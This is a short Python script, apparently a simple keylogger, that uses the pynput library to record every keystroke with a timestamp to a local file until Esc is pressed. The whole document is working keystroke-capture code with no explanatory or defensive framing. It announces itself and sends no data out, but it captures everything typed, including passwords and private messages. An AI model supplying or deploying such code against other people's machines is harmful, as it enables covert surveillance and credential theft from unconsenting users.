from pynput import keyboard
import time

logfilepath = "keylog.txt"

def onkeypress(key):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    try:
        with open(logfilepath, "a") as logfile:
            logfile.write(f"{timestamp} - {key.char}\n")
        print(f"Logged: {timestamp} - {key.char}")
    except AttributeError:
        with open(logfilepath, "a") as logfile:
            logfile.write(f"{timestamp} - {key}\n")
        print(f"Logged: {timestamp} - {key}")

    # Check if the pressed key is Esc
    if key == keyboard.Key.esc:
        print('Stopping the keylogger...')
        return False

def main():
    print("Press Esc to stop logging.")
    
    # Start the keyboard listener
    with keyboard.Listener(on_press=onkeypress) as listener:
        listener.join()

if __name__ == "__main__":
    main()
